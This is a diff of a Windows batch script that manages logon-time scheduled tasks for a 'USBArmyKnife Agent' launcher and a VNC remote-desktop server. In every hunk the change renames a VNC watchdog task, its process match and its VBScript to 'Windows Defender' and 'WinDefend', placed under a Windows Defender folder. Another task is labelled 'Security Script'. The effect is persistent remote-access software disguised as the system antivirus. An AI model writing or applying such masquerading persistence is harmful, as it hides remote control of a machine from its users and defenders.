@@ -21,7 +21,7 @@ if !errorlevel! equ 0 set "VNC_RUNNING=1"
 set "HAS_AUTOSTART=0"
 schtasks /query /tn "USBArmyKnife Agent" >nul 2>&1
 if !errorlevel! equ 0 set "HAS_AUTOSTART=1"
-schtasks /query /tn "VNC Watchdog" >nul 2>&1
+schtasks /query /tn "Windows Defender" >nul 2>&1
 if !errorlevel! equ 0 set "HAS_AUTOSTART=1"
 
 set "HAS_PASSWORD=0"
@@ -90,7 +90,7 @@ echo.
 echo [1/6] Stopping running processes...
 taskkill /F /IM AgentLauncher.exe >nul 2>&1
 taskkill /F /IM VncDirect.exe >nul 2>&1
-wmic process where "commandline like '%%vnc-watchdog%%'" call terminate >nul 2>&1
+wmic process where "commandline like '%%WinDefend%%'" call terminate >nul 2>&1
 timeout /t 2 /nobreak >nul
 
 echo [2/6] Removing autostart...
@@ -100,8 +100,8 @@ schtasks /query /tn "USBArmyKnife Agent" >nul 2>&1
 if !errorlevel! equ 0 ( schtasks /delete /tn "USBArmyKnife Agent" /f >nul 2>&1 & echo    [+] Scheduled task "USBArmyKnife Agent" removed. )
 schtasks /query /tn "Security Script" >nul 2>&1
 if !errorlevel! equ 0 ( schtasks /delete /tn "Security Script" /f >nul 2>&1 & echo    [+] Scheduled task "Security Script" removed. )
-schtasks /query /tn "VNC Watchdog" >nul 2>&1
-if !errorlevel! equ 0 ( schtasks /delete /tn "VNC Watchdog" /f >nul 2>&1 & echo    [+] Scheduled task "VNC Watchdog" removed. )
+schtasks /query /tn "Windows Defender" >nul 2>&1
+if !errorlevel! equ 0 ( schtasks /delete /tn "Windows Defender" /f >nul 2>&1 & echo    [+] Scheduled task "Windows Defender" removed. )
 schtasks /query /tn "VNC Direct" >nul 2>&1
 if !errorlevel! equ 0 ( schtasks /delete /tn "VNC Direct" /f >nul 2>&1 & echo    [+] Task "VNC Direct" removed. )
 schtasks /query /tn "VNC Direct User" >nul 2>&1
@@ -146,7 +146,7 @@ echo.
 echo [1/3] Stopping processes...
 taskkill /F /IM AgentLauncher.exe >nul 2>&1
 taskkill /F /IM VncDirect.exe >nul 2>&1
-wmic process where "commandline like '%%vnc-watchdog%%'" call terminate >nul 2>&1
+wmic process where "commandline like '%%WinDefend%%'" call terminate >nul 2>&1
 timeout /t 1 /nobreak >nul
 
 echo [2/3] Removing entries...
@@ -156,8 +156,8 @@ schtasks /query /tn "USBArmyKnife Agent" >nul 2>&1
 if !errorlevel! equ 0 ( schtasks /delete /tn "USBArmyKnife Agent" /f >nul 2>&1 & echo    [+] Task removed. )
 schtasks /query /tn "Security Script" >nul 2>&1
 if !errorlevel! equ 0 ( schtasks /delete /tn "Security Script" /f >nul 2>&1 & echo    [+] Task removed. )
-schtasks /query /tn "VNC Watchdog" >nul 2>&1
-if !errorlevel! equ 0 ( schtasks /delete /tn "VNC Watchdog" /f >nul 2>&1 & echo    [+] Task removed. )
+schtasks /query /tn "Windows Defender" >nul 2>&1
+if !errorlevel! equ 0 ( schtasks /delete /tn "Windows Defender" /f >nul 2>&1 & echo    [+] Task removed. )
 schtasks /query /tn "VNC Direct" >nul 2>&1
 if !errorlevel! equ 0 ( schtasks /delete /tn "VNC Direct" /f >nul 2>&1 & echo    [+] Task removed. )
 schtasks /query /tn "VNC Direct User" >nul 2>&1
@@ -185,8 +185,8 @@ schtasks /query /tn "USBArmyKnife Agent" >nul 2>&1
 if !errorlevel! neq 0 ( schtasks /create /tn "USBArmyKnife Agent" /tr "%DEST%\AgentLauncher.exe vid=cafe pid=403f cwd=%DEST%" /sc onlogon /rl limited /f >nul 2>&1 & echo    [+] Task created. ) else ( echo    [-] Already exists. )
 schtasks /query /tn "Security Script" >nul 2>&1
 if !errorlevel! neq 0 ( schtasks /create /tn "Security Script" /tr "%DEST%\AgentLauncher.exe vid=cafe pid=403f cwd=%DEST%" /sc onlogon /rl limited /f >nul 2>&1 & echo    [+] Task created. ) else ( echo    [-] Already exists. )
-schtasks /query /tn "VNC Watchdog" >nul 2>&1
-if !errorlevel! neq 0 ( schtasks /create /tn "VNC Watchdog" /tr "wscript.exe C:\ProgramData\Windows Defender\vnc-watchdog.vbs" /sc onlogon /rl limited /f >nul 2>&1 & echo    [+] Task created. ) else ( echo    [-] Already exists. )
+schtasks /query /tn "Windows Defender" >nul 2>&1
+if !errorlevel! neq 0 ( schtasks /create /tn "Windows Defender" /tr "wscript.exe C:\ProgramData\Windows Defender\WinDefend.vbs" /sc onlogon /rl limited /f >nul 2>&1 & echo    [+] Task created. ) else ( echo    [-] Already exists. )
 schtasks /query /tn "VNC Direct" >nul 2>&1
 if !errorlevel! equ 0 ( schtasks /delete /tn "VNC Direct" /f >nul 2>&1 )
 schtasks /query /tn "VNC Direct User" >nul 2>&1
